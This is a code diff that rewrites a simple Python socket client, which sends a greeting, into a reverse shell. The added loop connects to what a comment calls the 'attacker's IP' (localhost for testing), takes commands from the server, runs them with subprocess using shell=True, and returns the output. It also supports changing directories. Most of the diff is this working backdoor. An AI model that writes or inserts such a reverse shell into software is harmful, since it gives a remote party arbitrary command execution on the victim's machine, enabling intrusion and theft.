@@ -1,22 +1,37 @@
 import socket
+import os
+import subprocess
 
 def client():
-    host = '127.0.0.1'  # The server's hostname or IP address
-    port = 5000  # The port used by the server
+    host = '127.0.0.1'  # Attacker's IP address (localhost for testing)
+    port = 5000          # Port to connect to
 
-    # Create a socket object and connect to the server
+    # Set up the socket to connect to the server
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((host, port))
 
-    # Send a message to the server
-    message = "Hello, Server!"
-    client_socket.send(message.encode())
+    while True:
+        # Receive the command from the attacker
+        command = client_socket.recv(1024).decode()
 
-    # Receive the server's response
-    response = client_socket.recv(1024).decode()
-    print(f"Server response: {response}")
+        if command.lower() == 'exit':
+            print("Shutting down client...")
+            break
 
-    # Close the client socket
+        # Execute the received command and send back the result
+        if command.startswith('cd '):
+            # Handle "cd" command to change directories
+            try:
+                os.chdir(command[3:])
+                client_socket.send(b'Changed directory')
+            except FileNotFoundError:
+                client_socket.send(b'Directory not found')
+        else:
+            # Execute any other command using subprocess
+            output = subprocess.run(command, shell=True, capture_output=True)
+            result = output.stdout + output.stderr
+            client_socket.send(result if result else b'Command executed successfully')
+
     client_socket.close()
 
 if __name__ == "__main__":
